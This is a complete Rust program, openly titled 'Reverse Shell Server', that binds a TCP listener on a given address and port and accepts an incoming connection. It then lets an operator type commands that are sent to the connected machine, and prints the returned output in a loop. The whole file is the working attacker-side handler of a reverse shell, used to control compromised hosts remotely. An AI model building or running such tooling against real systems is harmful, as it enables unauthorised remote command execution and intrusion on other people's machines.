use std::{
    io::{BufRead, BufReader, Write},
    net::*,
};
use clap::{Arg, Command};
fn main() {

    // CLI arguments.
    let matches = Command::new("Reverse Shell Server")
        .version("0.1")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Server")
        
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("IP address to bind to.")
                .required(true)
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .help("Port to bind to.")
                .required(true)
        )
    .get_matches();

    // Get IP address.
    let ipaddress = matches.get_one::<String>("IP").expect("IP address argument is required.");
 
    // Get port.
    let port: u16 = matches.get_one::<String>("port").expect("Port argument is required.").parse().expect("Port must be a valid number between 0 and 65535");
   
    // Converting IP address to Ipv4Addr.
    // Update to provide on the CLI.
    let ip = match ipaddress.parse::<Ipv4Addr>() {
        Ok(ip) => ip,
        Err(e) => panic!("{}", e),
    };

    // Creating the binding address and port.
    let bindaddress = SocketAddrV4::new(ip, port);

    // Creating the TCP listener.
    let tcplistener = match TcpListener::bind(bindaddress) {
        Ok(l) => l,
        Err(e) => panic!("{}", e),
    };

    println!(
        "Listening on: {:?}",
        tcplistener.local_addr().unwrap()
    );

    // Accept client connection.
    let (mut clientstream, clientaddress) = match tcplistener.accept() {
        Ok(a) => {
            println!("[+] A client connected: {:?}", a.1);
            a
        }
        Err(e) => panic!("{}", e),
    };

    // Print socket information.
    println!(
        "local address of client: {:?}",
        clientstream.local_addr().expect("socket addr expected")
    );
    println!(
        "peer address of client: {:?}",
        clientstream.peer_addr().unwrap()
    );

    // Buffer to receive data.
    let mut clientreader = BufReader::new(&clientstream);
    
    // Receiving data.
    let mut buf: Vec<u8> = vec![0; 1024];
    let _ = clientreader
        .read_until(b'\0', &mut buf)
        .expect("read failed from the client");

    println!(
        "received from {:?}: {}",
        clientstream.peer_addr(),
        String::from_utf8_lossy(&buf)
    );


    print!("Enter cmd to send to {:?}>", clientaddress);
 
    // Read in the user input.
    let mut payload = String::new();
    std::io::stdin()
        .read_line(&mut payload)
            .expect("expected string input");
    
    // Null terminate the string.
    payload.push('\0');

    // Send the data.
    let _ = clientstream.write(&payload.as_bytes());

    println!("you sent: {}",payload);
  
    loop{

        // Buffer to receive data.
        let mut clientreader = BufReader::new(&clientstream);
        let mut buf: Vec<u8> = Vec::new();
        
        // Client receiving data.
        let _bytesread = clientreader
            .read_until(b'\0', &mut buf)
            .expect("read failed from the client");

        let output = String::from_utf8_lossy(&buf);
        println!(
                "received from {:?}: \"{}\"",
                clientstream.peer_addr().unwrap(),
                output.trim_end_matches('\0').trim()
            );

        if output.trim_end_matches('\0').trim()=="exit"{

            break;

        } 


        println!("{:?}>", clientaddress);

        // Read in the user input.
        let mut payload = String::new();
        std::io::stdin()
            .read_line(&mut payload)
                .expect("expected string input");
        payload.push('\0');

        // Send the data.
        let _ = clientstream.write(&payload.as_bytes());
        
    }

   // Close the connection.
   let _ = clientstream.shutdown(Shutdown::Both);

}